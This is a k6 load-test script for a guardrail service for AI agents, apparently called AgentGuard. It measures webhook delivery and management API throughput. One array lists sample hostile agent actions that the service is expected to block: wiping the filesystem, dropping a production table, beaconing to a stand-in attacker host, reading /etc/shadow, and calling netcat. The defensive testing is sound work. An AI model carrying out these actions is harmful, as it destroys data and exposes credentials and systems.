/**
 * AgentGuard Load Test — Webhook Delivery Throughput
 *
 * Tests webhook delivery throughput by:
 * 1. Generating high-volume policy evaluations (which trigger webhook events)
 * 2. Measuring webhook queue depth, delivery latency, and failure rates
 * 3. Verifying delivery at scale
 *
 * Also tests the webhook management API under load.
 *
 * Run:
 *   k6 run tests/load/webhook-delivery.js \
 *     -e BASE_URL=https://api.agentguard.tech \
 *     -e API_KEY=ag-your-key \
 *     -e JWT_TOKEN=your-jwt-token
 */

import http from 'k6/http';
import { check, sleep, group } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';
import { BASE_URL, apiHeaders, jwtHeaders } from './config.js';

// ── Custom Metrics ─────────────────────────────────────────────────────────
const webhookDeliveryErrors = new Rate('webhook_delivery_errors');
const webhookSetupSuccess = new Rate('webhook_setup_success');
const evaluationsTriggered = new Counter('evaluations_triggered_for_webhooks');
const webhookListLatency = new Trend('webhook_list_latency_ms', true);

// ── Test Configuration ─────────────────────────────────────────────────────
export const options = {
  scenarios: {
    // High-volume evaluation triggering webhook events
    evaluation_flood: {
      executor: 'constant-arrival-rate',
      rate: 2000,           // 2000 events/second → webhook triggers
      timeUnit: '1s',
      preAllocatedVUs: 100,
      maxVUs: 500,
      duration: '5m',
      tags: { flow: 'evaluation' },
    },
    // Management API access (CRUD on webhooks)
    management: {
      executor: 'ramping-vus',
      startVUs: 1,
      stages: [
        { duration: '30s', target: 20 },
        { duration: '3m',  target: 50 },
        { duration: '1m',  target: 0 },
      ],
      startTime: '30s',
      tags: { flow: 'management' },
    },
  },
  thresholds: {
    http_req_failed: ['rate<0.02'],
    http_req_duration: ['p(99)<500'],
    webhook_delivery_errors: ['rate<0.05'],  // <5% delivery failures acceptable
    webhook_list_latency_ms: ['p(99)<200'],
  },
  tags: { test_type: 'webhook_delivery' },
};

// ── Webhook targets (test receivers) ─────────────────────────────────────
// In real tests, point at webhook.site or your own test receiver
const WEBHOOK_RECEIVERS = [
  'https://webhook.site/test-agentguard-1',
  'https://webhook.site/test-agentguard-2',
  'https://httpbin.org/post',
];

// ── Evaluation payloads that trigger webhooks ─────────────────────────────
const TRIGGERING_EVENTS = [
  { tool: 'bash', action: 'rm -rf /', expect: 'block' },
  { tool: 'database_query', action: 'DROP TABLE production', expect: 'block' },
  { tool: 'http_request', action: 'https://c2.evil.com/beacon', expect: 'block' },
  { tool: 'read_file', action: '/etc/shadow', expect: 'block' },
  { tool: 'execute_code', action: 'import subprocess; subprocess.call(["nc",...])', expect: 'block' },
];

// ── Main VU function ──────────────────────────────────────────────────────
export default function () {
  const scenario = __ENV.SCENARIO || 'evaluation';

  if (scenario === 'management' || __VU % 20 === 0) {
    runManagementFlow();
  } else {
    runEvaluationFlow();
  }
}

function runEvaluationFlow() {
  const event = TRIGGERING_EVENTS[__ITER % TRIGGERING_EVENTS.length];

  const payload = JSON.stringify({
    tool: event.tool,
    action: event.action,
    session_id: `webhook-test-${__VU}-${__ITER}`,
  });

  const res = http.post(`${BASE_URL}/api/v1/evaluate`, payload, {
    headers: apiHeaders,
    tags: { flow: 'evaluation' },
  });

  const ok = check(res, {
    'evaluate 200': (r) => r.status === 200,
    'result present': (r) => {
      try { return JSON.parse(r.body).result !== undefined; } catch { return false; }
    },
  });

  evaluationsTriggered.add(1);
  webhookDeliveryErrors.add(!ok);
}

function runManagementFlow() {
  group('webhook_management', () => {
    // List webhooks
    const listStart = Date.now();
    const listRes = http.get(`${BASE_URL}/api/v1/webhooks`, {
      headers: jwtHeaders,
      tags: { flow: 'management', op: 'list' },
    });
    webhookListLatency.add(Date.now() - listStart);
    check(listRes, { 'list webhooks 200': (r) => r.status === 200 });

    // Occasionally create a webhook
    if (__ITER % 50 === 0) {
      const receiver = WEBHOOK_RECEIVERS[__VU % WEBHOOK_RECEIVERS.length];
      const createRes = http.post(
        `${BASE_URL}/api/v1/webhooks`,
        JSON.stringify({
          url: receiver,
          events: ['evaluation.blocked', 'evaluation.allowed', 'kill_switch.activated'],
          secret: `wh-secret-${__VU}-${Date.now()}`,
        }),
        {
          headers: jwtHeaders,
          tags: { flow: 'management', op: 'create' },
        }
      );

      const created = check(createRes, {
        'create webhook 201': (r) => r.status === 201,
      });
      webhookSetupSuccess.add(created);

      // If created, immediately list again to verify
      if (created) {
        sleep(0.5);
        const verifyRes = http.get(`${BASE_URL}/api/v1/webhooks`, {
          headers: jwtHeaders,
          tags: { flow: 'management', op: 'verify' },
        });
        check(verifyRes, { 'verify webhook appears': (r) => r.status === 200 });
      }
    }
  });

  sleep(Math.random() * 2 + 0.5);
}

// ── Setup ─────────────────────────────────────────────────────────────────
export function setup() {
  console.log('[setup] Webhook delivery load test');
  console.log('[setup] This test generates high-volume evaluations to trigger webhook delivery');
  console.log('[setup] Monitor webhook receiver logs to verify delivery throughput');
}
